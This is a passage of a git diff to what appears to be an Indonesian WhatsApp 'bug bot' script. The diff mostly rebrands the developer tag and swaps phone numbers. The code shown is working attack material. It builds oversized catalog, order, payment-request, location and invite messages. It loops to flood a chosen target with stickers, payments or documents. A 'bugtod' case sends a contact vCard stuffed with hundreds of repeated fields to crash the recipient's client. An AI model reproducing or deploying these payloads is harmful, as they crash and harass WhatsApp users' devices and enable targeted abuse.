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\nX-WA-BIZ-DESCRIPTION:Developer ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:Haikal\nEND:VCARD",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
@@ -576,7 +576,7 @@ var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"caption": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"caption": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 }
@@ -592,7 +592,7 @@ var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 "degreesLatitude": -6.936928157735237,
 "degreesLongitude": 107.72270679473877,
-"caption": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"caption": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: doc })
@@ -608,8 +608,8 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": ` 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
-"groupName": ` 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"inviteExpiration": ` ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
+"groupName": ` ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -629,10 +629,10 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 100000000000,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"message": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "jpegThumbnail":fs.readFileSync('./baseikal/image/pict.jpg'),
-"orderTitle": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
-"sellerJid": "6285723156229@s.whatsapp.net",
+"orderTitle": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
+"sellerJid": "37122252056@s.whatsapp.net",
 "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
 "totalAmount1000": "500000000000000",
 "totalCurrencyCode": "IDR",
@@ -651,19 +651,19 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
-"description": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"title": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
+"description": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 "jpegThumbnail": mekih,
 "currencyCode": "IDR",
-"footerText": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"footerText": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 "priceAmount1000": "10000000",
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 WE ARE NOT MASTAH`,
-"url": "wa.me/6285723156229"
+"retailerId": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ WE ARE NOT MASTAH!!!`,
+"url": "wa.me/37122252056"
 },
-"businessOwnerJid": "6285723156229@s.whatsapp.net",
+"businessOwnerJid": "37122252056@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -674,7 +674,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "KENALIN NIH DEK 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒",
+"name": "KENALIN NIH DEK ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶",
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -689,7 +689,7 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 said"
+"optionName": "ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ said"
 	}
 ],
 "selectableOptionsCount": 5
@@ -713,16 +713,16 @@ var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
 "product": {
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
-"title": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
-"description": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"title": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
+"description": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 "currencyCode": "IDR",
-"footerText": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"footerText": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 "productImageCount": 1,
 "firstImageId": 1,
-"retailerId": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 WE ARE NOT MASTAH`,
-"url": "wa.me/6285723156229"
+"retailerId": `© ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ WE ARE NOT MASTAH!!!`,
+"url": "wa.me/37122252056"
 },
-"businessOwnerJid": "6285723156229@s.whatsapp.net",
+"businessOwnerJid": "37122252056@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, catalog.message, { messageId: catalog.key.id })
@@ -738,14 +738,14 @@ if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|a
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
-m.reply(`c`)
+m.reply(`baiklah tuan`)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"text": `MY DEVELOPER ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -767,7 +767,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"text": `MY DEVELOPER ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -832,7 +832,7 @@ if (!isCreator) return
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-deploy(`${m.pushName} Hello Saya Bot 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 ${text ? ': ' + text : ''}`)
+deploy(`${m.pushName} Hello Saya Bot ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
@@ -841,7 +841,7 @@ if (!isCreator) throw sticOwner(from)
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`
+ydd = `Hallo Aku ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {sticker: thumb},{quoted: {
 key: { 
@@ -874,7 +874,7 @@ if (!isCreator) throw sticOwner(from)
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`
+ydd = `Hallo Aku ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {requestPaymentMessage: thumb},{quoted: {
 key: { 
@@ -886,7 +886,7 @@ participant: `0@s.whatsapp.net`,
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`,
+"text": `MY DEVELOPER ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`,
 }
 }
 }})
@@ -900,7 +900,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒`
+ydd = `Hallo Aku ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶`
 for (let i = 0; i < jumlah; i++) {
 haikal.sendMessage(m.chat, {document: thumb},{quoted: {
 key: {
@@ -915,7 +915,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,
+"fileName": `ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶${ngazap(prefix)}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 }
 }
@@ -956,14 +956,14 @@ if (isBan) throw sticBanLu(from)
 
 if (!isCreator) return
 anuin = fs.readFileSync('./baseikal/sound/ngeselin.BIN')
-haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 ${ngazap(prefix)}.BIN`, title: `𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒 ${ngazap(prefix)}.BIN` }, { quoted: doc })
+haikal.sendMessage(m.chat, { document: anuin, mimetype: 'application/octet-stream', fileName: `ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ${ngazap(prefix)}.BIN`, title: `ꪶ⛧ꫂ͢ৡৢ͜͡𝟒𝟎𝟒-𝗧𝗵𝗲𝗗𝗮𝗿𝗸𝗲𝗿⸸⁶⁶⁶ ${ngazap(prefix)}.BIN` }, { quoted: doc })
 }
 break
 //=================================================//
 case 'bugtod': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
- const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝑊𝑎𝑙𝑧𝐼𝑠𝐻𝑒𝑟𝑒\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 